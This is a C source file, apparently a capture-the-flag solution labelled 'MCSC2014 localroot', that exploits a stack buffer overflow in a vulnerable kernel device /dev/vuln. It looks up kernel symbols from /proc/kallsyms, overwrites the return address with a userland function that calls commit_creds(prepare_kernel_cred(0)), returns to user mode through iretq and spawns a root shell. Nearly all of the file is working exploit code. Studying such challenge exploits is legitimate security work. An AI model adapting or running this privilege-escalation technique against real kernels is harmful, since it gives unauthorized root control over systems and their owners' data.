/* localroot 500pts MCSC2014 stack buffer overflow exploit */
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <inttypes.h>
#include <sys/utsname.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>

#define OFF 176
#define PAGE_SIZE 0x1000

#define STACK(x)	(x + sizeof(x) - 80)

unsigned long _user_cs;
unsigned long _user_ss;
unsigned long _user_rflags;

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
ssize_t getroot(void * a, ssize_t b, int c);
char exit_stack[PAGE_SIZE];

static void prepare_user_segment()
{
	__asm__ ("movq %%cs,%0\t\n"
		 "movq %%ss,%1\t\n"
		 "pushfq \t\n"
		 "popq %2\t\n"
		 : "=r"(_user_cs),"=r"(_user_ss),"=r"(_user_rflags)
		 :
		 :"memory");

}

int win =0;
static unsigned long get_stack_pointer()
{
	unsigned long kaddr;

	asm("mov %%rsp,%%rax\t\n"
	    "mov %%rax,%0 \t\n"
	    :"=r"(kaddr));
	return kaddr;
}

static void drop_shell()
{
	printf("[+] WIN ... , drop shell \n");
	if(!win) {
		printf("Failed !\n");
		return;
	}

	execl("/bin/sh","/bin/sh",NULL);
	
}

static inline void setup_fake_stack()
{

	__asm__("swapgs;"
		"movq %0,0x20(%%rsp)\t\n"
		"movq %1,0x18(%%rsp)\t\n"
		"movq %2,0x10(%%rsp)\t\n"
		"movq %3,0x08(%%rsp)\t\n"
		"movq %4,0x00(%%rsp)\t\n"
		"iretq"
		::
		 "r" (_user_ss),
		 "r" (STACK(exit_stack)),
		 "r" (_user_rflags),
		 "r" (_user_cs),
		 "r" (drop_shell)
		 
		);
}


static unsigned long get_kernel_sym(char *name) {
	FILE *f;
	unsigned long addr;
	char dummy;
	char sname[512];
	struct utsname ver;
	int ret;
	int rep = 0;
	int oldstyle = 0;
 
	f = fopen("/proc/kallsyms", "r");
	if (f == NULL) {
		f = fopen("/proc/ksyms", "r");
		if (f == NULL)
			goto fallback;
		oldstyle = 1;
	}
 
repeat:
	ret = 0;
	while(ret != EOF) {
		if (!oldstyle)
			ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
		else {
			ret = fscanf(f, "%p %s\n", (void **)&addr, sname);
			if (ret == 2) {
				char *p;
				if (strstr(sname, "_O/") || strstr(sname, "_S."))
					continue;
				p = strrchr(sname, '_');
				if (p > ((char *)sname + 5) && !strncmp(p - 3, "smp", 3)) {
					p = p - 4;
					while (p > (char *)sname && *(p - 1) == '_')
						p--;
					*p = '\0';
				}
			}
		}
		if (ret == 0) {
			fscanf(f, "%s\n", sname);
			continue;
		}
		if (!strcmp(name, sname)) {
			printf("[+] Resolved %s to %p%s\n", name, (void *)addr, rep ? " (via System.map)" : "");
			fclose(f);
			return addr;
		}
	}
 
	fclose(f);
	if (rep)
		return 0;
fallback:
/* didn't find the symbol, let's retry with the System.map
   dedicated to the pointlessness of Russell Coker's SELinux
   test machine (why does he keep upgrading the kernel if
   "all necessary security can be provided by SE Linux"?)
*/
	uname(&ver);
	if (strncmp(ver.release, "2.6", 3))
		oldstyle = 1;
	sprintf(sname, "/boot/System.map-%s", ver.release);
	f = fopen(sname, "r");
	if (f == NULL)
		return 0;
	rep = 1;
	goto repeat;
}


ssize_t getroot(void * a, ssize_t b, int c) {
	win = 1;
	commit_creds(prepare_kernel_cred(0));
	
	setup_fake_stack();
	drop_shell();
}

int main(int argc,char **argv)
{
	int fd;
	char *payload;
	unsigned long stack_addr;
	
	void *ptr = &getroot;
	
	fd = open("/dev/vuln",O_RDWR);
	if ( fd == -1) {
		perror("/dev/vuln");
		return -1;
	}
	prepare_user_segment();
	commit_creds = (_commit_creds)get_kernel_sym("commit_creds");
	prepare_kernel_cred = (_prepare_kernel_cred)get_kernel_sym("prepare_kernel_cred");
	
	printf("[+] fetch  userspace segments ...\n");
	
	stack_addr = get_stack_pointer();
	
	printf("[+] code segment : %lx \n",_user_cs);
	printf("[+] stack segment : %lx \n",_user_ss);
	printf("[+] Eflags : %lx \n",_user_rflags);
	printf("[+] RSP : %lx \n",stack_addr);

//	setup_fake_stack();
	
	payload = mmap(0,4096,PROT_EXEC | PROT_WRITE | PROT_READ, MAP_SHARED | MAP_ANONYMOUS,-1,0);
	if (payload == (void*)-1) {
		perror("mmap failed");
		return -1;
	}
	
	memset(payload,0x00,4096);
	memset(payload,0x41,4095);

	//memset(&payload[OFF],0xcc,8);
	memcpy(&payload[OFF],&ptr,8);
	write(fd,payload,4096);
}
